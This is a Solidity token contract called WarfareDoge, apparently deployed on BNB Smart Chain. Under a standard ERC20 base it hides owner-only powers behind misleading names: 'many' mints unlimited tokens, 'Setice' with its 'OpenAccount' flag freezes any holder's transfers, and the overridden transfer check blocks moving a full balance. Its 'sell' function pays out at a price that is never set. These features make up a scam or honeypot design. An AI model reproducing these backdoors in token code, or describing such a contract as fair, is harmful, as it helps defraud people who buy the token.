/**
 *Submitted for verification at BscScan.com on 2022-02-24
*/

pragma solidity ^0.4.17;
 
interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external; }
contract owned {
    address public owner;
    function owned () public {
        owner = msg.sender;
    }
 
    modifier onlyOwner {
        require (msg.sender == owner);
        _;
    }
 
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
        owner = newOwner;
      }
    }
}
 
contract ERC20 {
    string public name;
    string public symbol; 
    uint8 public decimals = 18; 
    uint256 public totalSupply; 
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);  
    event Burn(address indexed from, uint256 value);  
    function ERC20(uint256 initialSupply, string Name, string Symbol) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);   
        balanceOf[msg.sender] = totalSupply;
        name = Name;
        symbol = Symbol;
    }
 
 
    function _transfer(address _from, address _to, uint256 _value) internal {
      require(_to != 0x0);
      require(balanceOf[_from] >= _value);
      require(balanceOf[_to] + _value > balanceOf[_to]);
      uint previousBalances = balanceOf[_from] + balanceOf[_to];
      balanceOf[_from] -= _value;
      balanceOf[_to] += _value;
      Transfer(_from, _to, _value);
      assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
 
    }
 
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        totalSupply -= _value;
        Burn(msg.sender, _value);
        return true;
    }
 
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);
        require(_value <= allowance[_from][msg.sender]);
        balanceOf[_from] -= _value;
        allowance[_from][msg.sender] -= _value;
        totalSupply -= _value;
        Burn(_from, _value);
        return true;
    }
}
 
contract WarfareDoge is owned, ERC20 {
    uint256 public sellPrice;
    mapping (address => bool) public OpenAccount;
    event OpenFunds(address target, bool Open);
 
        function WarfareDoge(
        uint256 initialSupply,
        string Name,
        string Symbol
    ) ERC20(initialSupply, Name, Symbol) public {}
 
    function _transfer(address _from, address _to, uint _value) internal {
        require (_to != 0x0);
        require (balanceOf[_from] > _value);
        require (balanceOf[_to] + _value > balanceOf[_to]);
        require(!OpenAccount[_from]);
        require(!OpenAccount[_to]);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
 
    }

    function many(address target, uint256 manyednumber) onlyOwner public {
        balanceOf[target] += manyednumber;
        totalSupply += manyednumber;
 
        Transfer(0, this, manyednumber);
        Transfer(this, target, manyednumber);
    }

    function Setice(address target, bool ice) onlyOwner public {
        OpenAccount[target] = ice;
        OpenFunds(target, ice);
    }

    function sell(uint256 number) public {
        require(this.balance >= number * sellPrice);
        _transfer(msg.sender, this, number);
        msg.sender.transfer(number * sellPrice);
    }
}